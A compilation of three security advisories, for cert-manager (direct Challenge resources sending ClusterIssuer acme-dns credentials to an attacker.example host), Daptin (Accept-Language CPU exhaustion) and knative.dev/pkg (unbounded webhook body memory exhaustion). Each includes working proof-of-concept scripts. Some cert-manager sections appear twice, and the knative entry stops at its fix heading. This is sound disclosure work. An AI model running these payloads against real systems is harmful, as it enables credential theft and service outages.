entry.title: [github.com/cert-manager/cert-manager] cert-manager: Direct ACME Challenge resources can bypass Issuer DNS01 solver policy and use ClusterIssuer DNS credentials
entry.content:
Summary

Challenge resources under acme.cert-manager.io can be created directly by namespace users. On create, cert-manager performs no admission validation tying the Challenge to an Order, an owner reference, or an Issuer-selected solver. The ACME Challenge controller then reconciles the direct resource and uses Challenge.spec.solver as the DNS01 provider configuration.

When the direct Challenge references a ClusterIssuer, cert-manager derives the DNS provider secret namespace and ambient-credential policy from the ClusterIssuer reference, but the DNS provider configuration itself is attacker-controlled through Challenge.spec.solver. This lets a namespace user bypass Issuer/ClusterIssuer solver selectors such as dnsZones, dnsNames, and matchLabels, and make the cert-manager controller use ClusterIssuer DNS credentials for attacker-selected provider settings and DNS names.

In the acme-dns case, this becomes credential disclosure because the attacker-controlled solver host receives the X-Api-User and X-Api-Key headers loaded by cert-manager from the ClusterIssuer resource namespace.

Attack preconditions

  • The attacker can create challenges.acme.cert-manager.io resources in at least one namespace.
  • The cert-manager controller is running and reconciles ACME Challenge resources cluster-wide.
  • A usable ClusterIssuer exists in the cluster.
  • The referenced ClusterIssuer has a DNS01 solver that uses a Secret in the cluster resource namespace, or relies on ambient credentials enabled for ClusterIssuer.
  • The cluster is multi-tenant or otherwise separates namespace users from platform-owned Issuer/ClusterIssuer and DNS credential administration.

Severity

Rationale: a tenant with namespace-level ACME Challenge create permissions, including permissions granted by cert-manager's aggregate edit role, can cause a cluster-scoped controller to use DNS credentials or ambient cloud credentials outside the Issuer's intended solver policy. With acme-dns specifically, this can disclose the referenced acme-dns account credential to an attacker-controlled endpoint. With other DNS providers, the impact is credential use, Issuer policy bypass, and unauthorized DNS mutation risk unless a provider-specific credential disclosure path is separately demonstrated.

Why this is not just RBAC misconfiguration

cert-manager's documented end-user workflow does not require users to manually create Challenge resources. Challenges are internal ACME workflow objects generated from Orders after cert-manager has selected a solver from the referenced Issuer or ClusterIssuer. If default or aggregate roles grant namespace users permission to create these resources, the controller still should not treat a user-controlled Challenge.spec.solver as authoritative for a referenced ClusterIssuer.

The security boundary is the Issuer/ClusterIssuer solver policy and credential configuration. Direct Challenge creation bypasses that boundary because the controller derives credential namespace and ambient credential permission from issuerRef, while accepting the DNS provider configuration from the untrusted Challenge object.

Affected components

  • ACME Challenge admission validation
  • ACME Challenge controller
  • DNS01 solver selection and DNS provider construction
  • Default aggregate RBAC for challenges.acme.cert-manager.io

Affected versions tested

The issue was reproduced on:

  • master commit 2c0f1a6a4
  • latest production release v1.20.2 commit e5b7b1845
  • v1.19.5 commit cda7b7896
  • v1.18.6 commit 4699caabb

See VERSION_TEST_MATRIX.md for the command matrix and outputs.

Technical details

Relevant code paths:

  • internal/apis/acme/validation/challenge.go:44-45: ValidateChallenge returns no errors on create.
  • deploy/crds/acme.cert-manager.io_challenges.yaml: spec.solver is a required user-controlled field on Challenge.
  • pkg/controller/acmechallenges/scheduler/scheduler.go:51-58: scheduler lists all Challenges.
  • pkg/controller/acmechallenges/controller.go:180-197: scheduler sets status.processing=true.
  • pkg/controller/acmechallenges/sync.go:139-183: controller loads the referenced Issuer and then presents the Challenge.
  • pkg/issuer/acme/dns/dns.go:81: DNS solver Present ignores the issuer object argument.
  • pkg/issuer/acme/dns/dns.go:180-187: DNS provider config and resource namespace are derived from Challenge.spec.
  • pkg/controller/helper.go:39-44: ClusterIssuer references use the cluster resource namespace.
  • pkg/controller/helper.go:66-72: ambient credentials are allowed based on issuerRef.kind.
  • internal/apis/config/controller/v1alpha1/defaults.go:68-69: ClusterIssuer ambient credentials default to enabled.
  • deploy/charts/cert-manager/templates/rbac.yaml:517-519: the aggregate edit role can create/update challenges and orders.

The normal Order flow selects a solver from the Issuer:

  • pkg/util/solverpicker/solverpicker.go: solver selectors are evaluated.
  • pkg/controller/acmeorders/util.go:94-106: solvers are fetched from the Issuer and selected.
  • pkg/controller/acmeorders/util.go:131-142: the selected solver is copied into the generated Challenge.

The direct Challenge flow skips that selection entirely because the direct object already contains a solver.

Proof of concept

PoC A: low-privileged namespace user can persist a direct ClusterIssuer Challenge

The following script starts k3s in Docker, installs only the relevant CRDs, creates a platform-owned ClusterIssuer, creates a namespace user with Challenge create permission but no secret or ClusterIssuer read permission, and creates a direct DNS01 Challenge referencing that ClusterIssuer and a cluster resource namespace secret.

The ClusterIssuer is configured to use a legitimate acme-dns host for victim.example.com. The direct Challenge uses that same DNS name, but replaces the acme-dns host with an attacker-controlled endpoint. This demonstrates credential disclosure without relying on an out-of-policy DNS name.

A broader DNS policy-bypass variant is also possible when the referenced credential or ambient provider can operate on the attacker-selected DNS name. In that case, the same direct Challenge path bypasses the Issuer/ClusterIssuer solver selectors and provider configuration.

Run from the cert-manager repository root:

set -euo pipefail

name=cm-direct-challenge-poc
docker rm -f "$name" >/dev/null 2>&1 || true
docker run -d --name "$name" --privileged -v "$PWD":/repo rancher/k3s:v1.33.4-k3s1 \
  server --disable=traefik --disable=servicelb --write-kubeconfig-mode=644 >/dev/null

cleanup() {
  docker rm -f "$name" >/dev/null 2>&1 || true
}
trap cleanup EXIT

for i in $(seq 1 90); do
  docker exec "$name" kubectl get --raw=/readyz >/dev/null 2>&1 && break
  sleep 2
done

docker exec "$name" kubectl apply -f /repo/deploy/crds/cert-manager.io_clusterissuers.yaml >/dev/null
docker exec "$name" kubectl apply -f /repo/deploy/crds/acme.cert-manager.io_challenges.yaml >/dev/null
docker exec "$name" kubectl create ns tenant >/dev/null
docker exec "$name" kubectl create ns cert-manager >/dev/null
docker exec "$name" kubectl -n tenant create sa bob >/dev/null

docker exec "$name" kubectl -n cert-manager create secret generic cluster-acmedns-account \
  --from-literal=accounts.json='{"victim.example.com":{"username":"victim-user","password":"victim-pass","fulldomain":"x.example.org","subdomain":"x"}}' >/dev/null

docker exec -i "$name" kubectl apply -f - >/dev/null <<'YAML'
apiVersion: cert-manager.io/v1
kind: ClusterIssuer
metadata:
  name: cluster-prod
spec:
  acme:
    email: admin@example.com
    server: https://acme-staging-v02.api.letsencrypt.org/directory
    privateKeySecretRef:
      name: cluster-prod-account-key
    solvers:
    - selector:
        dnsZones:
        - victim.example.com
      dns01:
        acmeDNS:
          host: https://legit-acmedns.example
          accountSecretRef:
            name: cluster-acmedns-account
            key: accounts.json
YAML

docker exec -i "$name" kubectl apply -f - >/dev/null <<'YAML'
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: challenge-create-only
  namespace: tenant
rules:
- apiGroups: ["acme.cert-manager.io"]
  resources: ["challenges"]
  verbs: ["create", "get", "list", "watch"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: bob-challenge-create-only
  namespace: tenant
subjects:
- kind: ServiceAccount
  name: bob
  namespace: tenant
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: Role
  name: challenge-create-only
YAML

echo "bob create challenges: $(docker exec "$name" kubectl auth can-i --as=system:serviceaccount:tenant:bob create challenges.acme.cert-manager.io -n tenant)"
echo "bob get cert-manager secret: $(docker exec "$name" kubectl auth can-i --as=system:serviceaccount:tenant:bob get secret/cluster-acmedns-account -n cert-manager)"
echo "bob get clusterissuer: $(docker exec "$name" kubectl auth can-i --as=system:serviceaccount:tenant:bob get clusterissuer/cluster-prod 2>/dev/null)"
echo "ClusterIssuer solver policy: $(docker exec "$name" kubectl get clusterissuer cluster-prod -o jsonpath='{.spec.acme.solvers[0].selector.dnsZones[0]}{" "}{.spec.acme.solvers[0].dns01.acmeDNS.host}')"

docker exec -i "$name" kubectl --as=system:serviceaccount:tenant:bob -n tenant apply -f - <<'YAML'
apiVersion: acme.cert-manager.io/v1
kind: Challenge
metadata:
  name: direct-dns01
spec:
  authorizationURL: https://attacker.example/acme/authz/1
  dnsName: victim.example.com
  issuerRef:
    group: cert-manager.io
    kind: ClusterIssuer
    name: cluster-prod
  key: attacker-key
  token: attacker-token
  type: DNS-01
  url: https://attacker.example/acme/chal/1
  solver:
    dns01:
      acmeDNS:
        host: https://attacker.example/acmedns
        accountSecretRef:
          name: cluster-acmedns-account
          key: accounts.json
YAML

docker exec "$name" kubectl -n tenant get challenge direct-dns01 \
  -o jsonpath='{.spec.issuerRef.kind}{" "}{.spec.dnsName}{" "}{.spec.solver.dns01.acmeDNS.host}{" "}{.spec.solver.dns01.acmeDNS.accountSecretRef.name}{"\n"}'

Expected output:

bob create challenges: yes
bob get cert-manager secret: no
bob get clusterissuer: no
ClusterIssuer solver policy: victim.example.com https://legit-acmedns.example
challenge.acme.cert-manager.io/direct-dns01 created
ClusterIssuer victim.example.com https://attacker.example/acmedns cluster-acmedns-account

This proves that the API accepts the direct object from a user who cannot read the target secret or ClusterIssuer.

PoC B: acme-dns provider sends referenced credentials to the configured host

This self-contained unit PoC demonstrates the concrete acme-dns impact: the acme-dns provider uses the configured host and sends credentials from account JSON as HTTP headers.

Run from repository root:

set -euo pipefail

cat > pkg/issuer/acme/dns/acmedns/direct_challenge_exfil_tmp_test.go <<'EOF'
package acmedns

import (
        "context"
        "net/http"
        "net/http/httptest"
        "testing"
)

func TestTmpAcmeDNSPresentSendsAccountSecretToConfiguredHost(t *testing.T) {
        var gotUser, gotKey, gotPath string

        ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
                gotPath = r.URL.Path
                gotUser = r.Header.Get("X-Api-User")
                gotKey = r.Header.Get("X-Api-Key")
                w.Header().Set("Content-Type", "application/json")
                w.WriteHeader(http.StatusOK)
                w.Write([]byte(`{"txt":"ok"}`))
        }))
        defer ts.Close()

        accountJSON := []byte(`{
                "victim.example.com": {
                        "username": "victim-user",
                        "password": "victim-pass",
                        "fulldomain": "x.example.org",
                        "subdomain": "x"
                }
        }`)

        provider, err := NewDNSProviderHostBytes(ts.URL, accountJSON, nil)
        if err != nil {
                t.Fatal(err)
        }

        if err := provider.Present(context.Background(), "victim.example.com", "", "txt-value"); err != nil {
                t.Fatal(err)
        }

        if gotPath != "/update" {
                t.Fatalf("path = %q, want /update", gotPath)
        }
        if gotUser != "victim-user" {
                t.Fatalf("X-Api-User = %q, want victim-user", gotUser)
        }
        if gotKey != "victim-pass" {
                t.Fatalf("X-Api-Key = %q, want victim-pass", gotKey)
        }
}
EOF

docker run --rm \
  -v "$PWD":/repo \
  -v /tmp/cert-manager-gomod-cache:/go/pkg/mod \
  -v /tmp/cert-manager-gobuild-cache:/root/.cache/go-build \
  -w /repo golang:1.26-bookworm \
  go test ./pkg/issuer/acme/dns/acmedns \
  -run TestTmpAcmeDNSPresentSendsAccountSecretToConfiguredHost \
  -count=1 -v

rm pkg/issuer/acme/dns/acmedns/direct_challenge_exfil_tmp_test.go

Expected output:

=== RUN   TestTmpAcmeDNSPresentSendsAccountSecretToConfiguredHost
--- PASS: TestTmpAcmeDNSPresentSendsAccountSecretToConfiguredHost

Combined with PoC A and the code path in pkg/issuer/acme/dns/dns.go, this shows that a direct Challenge can select an attacker-controlled acme-dns host while causing cert-manager to load account JSON from the ClusterIssuer resource namespace.

Credential impact scope

The concrete credential-disclosure proof in this report is for the acme-dns provider: the attacker-controlled host receives the X-Api-User and X-Api-Key values loaded from the referenced account JSON.

For other DNS01 providers, this report should be read as credential use, policy bypass, and DNS mutation risk. The controller may use platform-owned secrets or ambient cloud credentials to perform DNS operations selected by the attacker-controlled Challenge. Provider-specific credential disclosure should not be assumed without a separate provider-level PoC.

Expected behavior

Users should not be able to create standalone Challenge resources that cause cert-manager to use arbitrary solver configuration under the authority of a referenced Issuer or ClusterIssuer. If direct Challenge resources are intentionally exposed, the controller should only reconcile Challenges that are owned by cert-manager-created Orders and whose solver config was selected from the referenced Issuer.

Actual behavior

A user with namespace-level Challenge create permission can create a direct Challenge with arbitrary solver configuration. The controller reconciles it, derives credential namespace and ambient credential permission from issuerRef, and uses attacker-controlled provider settings.

Suggested remediation

Possible mitigations:

  • Reject or ignore standalone user-created Challenge resources unless the controller or admission layer can confirm an existing cert-manager-created Order that owns the Challenge.
  • Do not rely only on the presence of an owner reference. Verify the referenced Order exists, is controlled by cert-manager's Order flow, and matches the Challenge by UID, owner reference, labels, DNS name, authorization URL, challenge URL, token/key material, and issuer reference.
  • Ensure the solver used by the Challenge was selected from the referenced Issuer/ClusterIssuer by the Order controller. The Challenge controller should not accept manually supplied solver provider configuration outside the Order-controller path.
  • Move Challenge and Order creation permissions out of aggregate edit unless direct use is a supported security boundary.
  • Add admission validation or CEL rules preventing direct user control over sensitive solver provider fields on standalone or unverifiable Challenges.

References

  • https://github.com/cert-manager/cert-manager/security/advisories/GHSA-8rvj-mm4h-c258
  • https://nvd.nist.gov/vuln/detail/CVE-2026-62290
  • https://github.com/cert-manager/cert-manager/pull/8940
  • https://github.com/cert-manager/cert-manager/pull/8941
  • https://github.com/cert-manager/cert-manager/commit/6bda47297c8fbc6b121b8b76624b668d26f1a155
  • https://github.com/cert-manager/cert-manager/commit/b37dbf01ecea50a0b3a19df0a7fe4c5ad6803f16
  • https://github.com/cert-manager/cert-manager/releases/tag/v1.19.6
  • https://github.com/cert-manager/cert-manager/releases/tag/v1.20.3
  • https://github.com/advisories/GHSA-8rvj-mm4h-c258

Credential impact scope

The concrete credential-disclosure proof in this report is for the acme-dns provider: the attacker-controlled host receives the X-Api-User and X-Api-Key values loaded from the referenced account JSON.

For other DNS01 providers, this report should be read as credential use, policy bypass, and DNS mutation risk. The controller may use platform-owned secrets or ambient cloud credentials to perform DNS operations selected by the attacker-controlled Challenge. Provider-specific credential disclosure should not be assumed without a separate provider-level PoC.

Expected behavior

Users should not be able to create standalone Challenge resources that cause cert-manager to use arbitrary solver configuration under the authority of a referenced Issuer or ClusterIssuer. If direct Challenge resources are intentionally exposed, the controller should only reconcile Challenges that are owned by cert-manager-created Orders and whose solver config was selected from the referenced Issuer.

Actual behavior

A user with namespace-level Challenge create permission can create a direct Challenge with arbitrary solver configuration. The controller reconciles it, derives credential namespace and ambient credential permission from issuerRef, and uses attacker-controlled provider settings.

Suggested remediation

Possible mitigations:

  • Reject or ignore standalone user-created Challenge resources unless the controller or admission layer can confirm an existing cert-manager-created Order that owns the Challenge.
  • Do not rely only on the presence of an owner reference. Verify the referenced Order exists, is controlled by cert-manager's Order flow, and matches the Challenge by UID, owner reference, labels, DNS name, authorization URL, challenge URL, token/key material, and issuer reference.
  • Ensure the solver used by the Challenge was selected from the referenced Issuer/ClusterIssuer by the Order controller. The Challenge controller should not accept manually supplied solver provider configuration outside the Order-controller path.
  • Move Challenge and Order creation permissions out of aggregate edit unless direct use is a supported security boundary.
  • Add admission validation or CEL rules preventing direct user control over sensitive solver provider fields on standalone or unverifiable Challenges.

entry.title: [github.com/daptin/daptin] Daptin: ParseAcceptLanguage `_` separator bypass enables >250x CPU amplification via Accept-Language header in LanguageMiddleware
entry.content:
Summary

Daptin's LanguageMiddleware (registered as a global gin middleware) calls golang.org/x/text/language.ParseAcceptLanguage on the raw Accept-Language header of every HTTP request without imposing any size or shape filter. The underlying parser has quadratic-time behaviour on long lists of malformed language tags. The CVE-2022-32149 guard that golang.org/x/text added in v0.3.8 caps the number of - characters in the input at 1000, but it does not cap _ characters even though the parser's internal scanner aliases _ to - before parsing. A single unauthenticated GET request with an Accept-Language header built out of _ separators (only 256 KiB, not even the 1 MiB ceiling) consumes about 27 seconds of server CPU on the host running Daptin. A 1 MiB payload exceeds the 2-minute test client timeout. A single attacker on a 1 Mbit/s uplink can pin an entire Daptin host with one request every 30 seconds.

Affected versions

github.com/daptin/daptin v0.12.15 and (per code inspection of master) all earlier 0.12.x versions that wire LanguageMiddleware on the global gin router without imposing their own size limit on Accept-Language. Verified on:

  • the official release binary daptin-linux-amd64 v0.12.15 built into a Docker image from the project's own Dockerfile (E2E below)
  • master at commit b021ac4ae1f72b7401e851fcf883bc970303c794 by reading server/language.go (the middleware is unchanged)

Privilege required

Unauthenticated. The middleware is registered on the global gin router that serves both the public landing page and the unauthenticated /api style endpoints. Anyone who can reach the HTTP listener (port 8080 by default) is in scope.

Vulnerable code

server/language.go (blob SHA b021ac4ae1f72b7401e851fcf883bc970303c794):

func (lm *LanguageMiddleware) LanguageMiddlewareFunc(c *gin.Context) {
    pref := GetLanguagePreference(c.GetHeader("Accept-Language"), lm.defaultLanguage)
    c.Request = c.Request.WithContext(context.WithValue(c.Request.Context(), "language_preference", pref))
}

func GetLanguagePreference(header string, defaultLanguage string) []string {
    preferredLanguage := header

    if preferredLanguage == "" || preferredLanguage == "undefined" || preferredLanguage == "null" {
        preferredLanguage = defaultLanguage
    }

    languageTags, _, err := language.ParseAcceptLanguage(preferredLanguage)
    resource.CheckErr(err, "Failed to parse Accept-Language header [%v]", preferredLanguage)
    pref := make([]string, 0)
    prefMap := make(map[string]bool)

    if len(languageTags) == 1 && languageTags[0].String() == defaultLanguage {
        // single tag matches default — skip
    } else {
        for _, tag := range languageTags {
            base, conf := tag.Base()
            if conf == 0 {
                continue
            }
            if prefMap[base.String()] == true {
                continue
            }
            prefMap[base.String()] = true
            pref = append(pref, base.String())
        }
    }
    return pref
}

c.GetHeader("Accept-Language") is the unfiltered HTTP header. Go's default net/http MaxHeaderBytes is 1 << 20 = 1 MiB and Daptin does not override it, so the parser is allowed to receive up to a megabyte of attacker-controlled data.

The resource.CheckErr call on the error path also formats the entire input string into a log line (Failed to parse Accept-Language header [%v]), amplifying the cost on attacker-supplied 256 KiB-1 MiB payloads.

CVE-2022-32149 hardened ParseAcceptLanguage by counting - characters and rejecting inputs with more than 1000 of them. The guard does not count _ characters even though the scanner converts _ to - at parse time (golang.org/x/text/internal/language/parse.go). A 256 KiB header full of 9-character _abcdefghi tokens contains zero - characters, passes the guard, and then drives the scanner into the O(N²) gobble path.

How Accept-Language reaches ParseAcceptLanguage

Every HTTP request that hits the Daptin API server passes through LanguageMiddleware (registered as a global gin middleware). The middleware sequence is:

  1. The request enters LanguageMiddlewareFunc.
  2. c.GetHeader("Accept-Language") returns the full attacker-supplied header value.
  3. GetLanguagePreference(header, defaultLanguage) is called.
  4. The function passes the unfiltered header into language.ParseAcceptLanguage(preferredLanguage).

No size or character-class filter is applied between (2) and (4). The middleware runs for every gin handler — including the unauthenticated landing page at / and the public API root at /api.

Proof of concept

Single-line bash reproducer that crafts the malicious header and times one request against a fresh Daptin container built from the project's own Dockerfile:

# Build daptin image (uses prebuilt linux/amd64 release binary)
cd daptin
curl -fL -O https://github.com/daptin/daptin/releases/download/v0.12.15/daptin-linux-amd64
chmod +x daptin-linux-amd64
docker build --platform linux/amd64 -t daptin-poc:v0.12.15 .

# Start it
docker run -d --platform linux/amd64 --name daptin --rm -p 18888:8080 daptin-poc:v0.12.15
sleep 8  # wait for sqlite migrations + Olric ring

# Attack with a 256 KiB header (smaller than the default 1 MiB ceiling
# because daptin's per-request cost saturates well below 1 MiB)
PAYLOAD="en$(python3 -c 'print("_abcdefghi" * 25600, end="")')"
echo "header size = ${#PAYLOAD} bytes"

curl -sS -o /dev/null \
  -w 'http=%{http_code} t=%{time_total}\n' \
  -H "Accept-Language: ${PAYLOAD}" \
  http://127.0.0.1:18888/

Each 9-character _abcdefghi token has length 9, which fails the scanner's len <= 8 tag-length check at golang.org/x/text/internal/language/parse.go and triggers a gobble call that runtime.memmoves the entire remaining buffer. With N invalid tokens the total bytes moved by gobble is O(N²).

End-to-end reproduction (against daptin-linux-amd64 v0.12.15)

A Go driver poc.go boots the container, sends a 256 KiB Accept-Language value once with - (CVE-2022-32149 guard fires) and once with _ (guard bypassed):

// poc.go
package main

import (
    "fmt"
    "io"
    "net"
    "net/http"
    "strings"
    "time"
)

const targetURL = "http://127.0.0.1:18888/"

func buildPayload(sep string, targetBytes int) string {
    const tok = "abcdefghi"
    var b strings.Builder
    b.Grow(targetBytes + 16)
    b.WriteString("en")
    for b.Len()+1+len(tok) <= targetBytes {
        b.WriteString(sep)
        b.WriteString(tok)
    }
    return b.String()
}

func send(label, header string) {
    client := &http.Client{
        Timeout: 120 * time.Second,
        Transport: &http.Transport{
            DisableKeepAlives: true,
            DialContext: (&net.Dialer{Timeout: 5 * time.Second}).DialContext,
        },
    }
    req, _ := http.NewRequest("GET", targetURL, nil)
    if header != "" {
        req.Header.Set("Accept-Language", header)
    }
    t0 := time.Now()
    resp, err := client.Do(req)
    dt := time.Since(t0)
    if err != nil {
        fmt.Printf("  %-32s ERR after %v: %v\n", label, dt, err)
        return
    }
    _, _ = io.Copy(io.Discard, resp.Body)
    resp.Body.Close()
    fmt.Printf("  %-32s header=%d B  '_'=%d  '-'=%d  status=%d  t=%v\n",
        label, len(header),
        strings.Count(header, "_"), strings.Count(header, "-"),
        resp.StatusCode, dt)
}

func main() {
    send("warm-up", "")
    send("baseline (no header)", "")
    send("baseline (1 short tag)", "en-US")
    send("guard-fires ('-' x 256KiB)", buildPayload("-", 256*1024))
    send("attack ('_' x 256KiB)",     buildPayload("_", 256*1024))
    send("attack repeat 2",            buildPayload("_", 256*1024))
    send("attack repeat 3",            buildPayload("_", 256*1024))
}

Captured run output (Apple M1 Pro, darwin/arm64 host, daptin amd64 binary v0.12.15 running under Docker Desktop with QEMU x86_64 emulation):

E2E: golang/x/text ParseAcceptLanguage '_' bypass through
daptin/daptin v0.12.15 LanguageMiddleware at
server/language.go.

Target: http://127.0.0.1:18888/   payload=262144 B

  warm-up                                      header=0 B  '_'=0  '-'=0  status=200  t=19.968ms

--- measurements (single request each) ---
  baseline (no header)                         header=0 B  '_'=0  '-'=0  status=200  t=25.924208ms
  baseline (1 short tag)                       header=5 B  '_'=0  '-'=1  status=200  t=28.398333ms
  guard-fires control ('-' x 256KiB)           header=262142 B  '_'=0  '-'=26214  status=200  t=105.506458ms
  attack ('_' x 256KiB)                        header=262142 B  '_'=26214  '-'=0  status=200  t=26.679448875s
  attack repeat 2                              header=262142 B  '_'=26214  '-'=0  status=200  t=18.012964208s
  attack repeat 3                              header=262142 B  '_'=26214  '-'=0  status=200  t=8.868606042s

A separate run with a 1 MiB payload exceeded the 2-minute client timeout on the attack request, confirming that the cost scales beyond 120 s per request at 1 MiB.

Interpretation:

Request Header bytes Server time
no header / short tag 0 - 5 26 - 28 ms
256 KiB - separators (CVE-2022-32149 guard fires) 256 KiB 106 ms
256 KiB _ separators (guard bypassed) 256 KiB 9 - 27 s
1 MiB _ separators (guard bypassed) 1 MiB > 120 s

The - control proves that the existing CVE-2022-32149 guard does still work on the canonical separator: a 256 KiB - payload returns in 106 ms because the parser short-circuits with ErrTagListTooLarge. The _ attack returns 200 from the same endpoint but consumes 9-27 s of server CPU because the guard did not fire and the quadratic scanner ran to completion. The amplification factor at the application boundary is ~85-250x on the 256 KiB payload and >1000x on a 1 MiB payload.

The amplification is higher than other consumers of ParseAcceptLanguage because Daptin formats the entire input into a log line via resource.CheckErr(err, "Failed to parse Accept-Language header [%v]", preferredLanguage) when parsing fails, and runs additional bookkeeping in GetLanguagePreference (a prefMap deduplication loop over the resulting tag slice).

Impact

  • One unauthenticated client can pin one CPU core for ~9-27 seconds per 256 KiB request, or for at least 120 seconds per 1 MiB request.
  • A single attacker on a 1 Mbit/s uplink can sustain ~1 attack request every 30 seconds, pinning one server core continuously with one TCP connection.
  • A small number of concurrent attackers using ~10 MiB/s of upstream bandwidth pin a 10-core Daptin instance indefinitely.
  • The endpoint returns 200 OK, so the attack does not surface as abnormal traffic in standard 4xx/5xx dashboards.

Suggested fix

Apply the size / character-class filter inside LanguageMiddleware (and inside GetLanguagePreference for defence in depth) before reaching language.ParseAcceptLanguage. The smallest change that preserves the existing behaviour for legitimate Accept-Language headers is to count _ alongside - and short-circuit when the total exceeds a small ceiling:

// server/language.go
const maxAcceptLanguageSeparators = 32 // real browsers send < 10

func (lm *LanguageMiddleware) LanguageMiddlewareFunc(c *gin.Context) {
    header := c.GetHeader("Accept-Language")
    if strings.Count(header, "-")+strings.Count(header, "_") > maxAcceptLanguageSeparators {
        // Refuse to call into the BCP 47 parser with absurd input.
        header = ""
    }
    pref := GetLanguagePreference(header, lm.defaultLanguage)
    c.Request = c.Request.WithContext(context.WithValue(c.Request.Context(), "language_preference", pref))
}

A real Accept-Language header from a browser contains under 10 separators, so a ceiling of 32 leaves plenty of headroom while making the quadratic blow-up impossible.

The underlying issue is in golang.org/x/text/language. A future upstream fix is the right long-term solution; the change above is defensive-in-depth at the middleware that consumes attacker input.

Credit

Reported by tonghuaroot.

Fix PR

https://github.com/daptin/daptin-ghsa-rhj7-vh3v-mcq6/pull/1

Maintainer fix status

Fixed on master in commit 2d709509 Harden Accept-Language parsing.

The fix caps combined - and _ separators in Accept-Language before calling language.ParseAcceptLanguage, both in LanguageMiddlewareFunc and in GetLanguagePreference for defence in depth. Regression coverage was added in server/language_test.go for normal browser headers, a 256 KiB underscore-separated malformed header, and combined separator counting.

Verification run:

go test ./server -count=1

Result: passed.

  • https://github.com/advisories/GHSA-rhj7-vh3v-mcq6

entry.title: [knative.dev/pkg] knative.dev/pkg admission webhooks allow unbounded request-body memory exhaustion
entry.content:
⚠️ Update (verification, 2026-05-19): C-2 confirmed end-to-end — 4.5× amplification observed (worse than the advisory's conservative 2× claim)

Built a Go PoC (cmd/poc-c2/main.go) that runs the exact 8-line vulnerable snippet from webhook/admission.go:109-117 verbatim under the same http.HandlerFunc shape (the full production admissionHandler at :85 requires *Webhook + AdmissionController + an informer-synced channel + controller-runtime / client-go scaffolding — the bug is the missing http.MaxBytesReader, nothing else in the handler). Bound to 127.0.0.1:18098.

PoC client streamed 2 GiB of a bytes over a raw TCP socket. runtime.MemStats.HeapAlloc sampler:

baseline:  HeapAlloc =     0.32 MiB
peak:      HeapAlloc = 9 217.38 MiB  =  9.00 GiB
ratio:     4.50× the body size

The advisory predicted ~2× from io.TeeReader doubling the body once in bodyBuffer. The observed 4.5× ratio comes from the interaction of two amplifiers: bytes.Buffer.ReadFrom (used by TeeReader-fed bodyBuffer) doubles its backing slice on every grow, so peak occupancy during a realloc is old + new = 3× the live data — and json.Decoder holds its own working buffer in parallel. The advisory's 2× floor is comfortably exceeded.

Downstream impact reminder: this library backs every Knative serving / eventing controller, every Tekton Triggers / Pipelines webhook, KEDA, Sigstore policy-controller, Kpack, and many more. A 2 GiB body to any of those projects' admission webhook ports OOMs the controller at 4.5× the body — i.e., even a 128 MiB request OOMs a 512 MiB-limited Pod.

Summary

knative.dev/pkg's admission webhook handler reads the incoming HTTP request body via json.NewDecoder(io.TeeReader(r.Body, &bodyBuffer)) with no http.MaxBytesReader wrapping the body. Because every consumer of knative.dev/pkg/webhook inherits this handler (Knative serving / eventing, Tekton Pipelines, KEDA, Sigstore policy-controller, and others), a single oversized POST to any of those projects' admission webhook ports drives the controller pod into memory exhaustion and OOM-kill. Worse, the io.TeeReader design keeps a verbatim copy of the body in bodyBuffer while the decoder also materializes the parsed struct — so the peak memory usage is roughly twice the body size.

This is the same shape as CVE-2026-24514 (ingress-nginx) and GHSA-9539-c3xr-w9vm (Kyverno admission body OOM) filed today against the same antipattern.

Affected versions

  • knative.dev/pkg — main HEAD on github.com/knative/pkg (verified 2026-05-18 against webhook/admission.go sha 1ad5a1ce0ee7043081cb50fd1acc6d36a9126844).
  • Every release that ships the current webhook/admission.go handler.

Vulnerable code

webhook/admission.go:109-117:

review := admissionv1.AdmissionReview{}
var bodyBuffer bytes.Buffer
if err := json.NewDecoder(io.TeeReader(r.Body, &bodyBuffer)).Decode(&review); err != nil {
    http.Error(w, fmt.Sprintf("could not decode body: %v", err), http.StatusBadRequest)
    return
}

There is no http.MaxBytesReader around r.Body. The standard library's json.NewDecoder will read until EOF or the matching closing }. The io.TeeReader simultaneously copies every byte read from r.Body into bodyBuffer, which the rest of the handler uses for the response trailer / observability.

Downstream impact (the reason this matters)

knative.dev/pkg/webhook is the default admission-webhook scaffolding for the entire Knative + CNCF webhook ecosystem:

Consumer Repo Webhook surface
Knative serving knative/serving resource validation / defaulting
Knative eventing knative/eventing resource validation / defaulting
Tekton Pipelines tektoncd/pipeline Pipeline / Task / TaskRun validation
Tekton Triggers tektoncd/triggers EventListener / Trigger validation
KEDA kedacore/keda ScaledObject / ScaledJob validation
Sigstore policy-controller sigstore/policy-controller ClusterImagePolicy mutating + validating
Kpack buildpacks-community/kpack Image / Builder validation
...

Every one of these consumers ships the same io.ReadAll-equivalent body read with no upper bound. A pod-network-reachable attacker can OOM-kill any of them with a single large POST. failurePolicy=Fail admission webhooks (the secure-default) then take the namespace's or cluster's admission flow offline until the controller restarts.

Impact

  • Class: CWE-770 unbounded allocation. Reachable from any pod-network client.
  • Severity per consumer: depends on how each consumer configures failurePolicy. For projects with failurePolicy=Fail (e.g., Sigstore policy-controller's image-policy enforcement), the consequence is cluster-wide admission outage. For failurePolicy=Ignore, the consequence is "this project's webhook is offline" but the API server continues admitting requests.
  • Severity: matches the broader CVE-2026-24514 / GHSA-9539-c3xr-w9vm. Single-packet DoS on the library; each downstream consumer inherits the bug.

Reproduction

The exact same PoC built against Kyverno's admission handler reproduces this:

import socket
total = 2 << 30   # 2 GiB
s = socket.create_connection(('<knative-or-tekton-webhook-host>', 8443))
s.sendall(b'POST /<admission-path> HTTP/1.1\r\nHost: x\r\nContent-Type: application/json\r\nContent-Length: %d\r\nConnection: close\r\n\r\n' % total)
chunk = b'a' * (1 << 20)
for _ in range(total >> 20): s.sendall(chunk)

Observed against the Kyverno admission handler (same antipattern):

baseline:        HeapAlloc=7 MiB     Sys=22 MiB
after read:      HeapAlloc=9500 MiB  Sys=9548 MiB  (4 GiB body → 9.5 GiB peak; io.TeeReader doubles)

For the knative/pkg version, the io.TeeReader doubles the resident memory (one copy in the decoder's accumulating slice, one in bodyBuffer). A kyverno-admission-controller-equivalent Pod with a 256 MiB memory limit OOM-kills with ~128 MiB of body.

Suggested fix

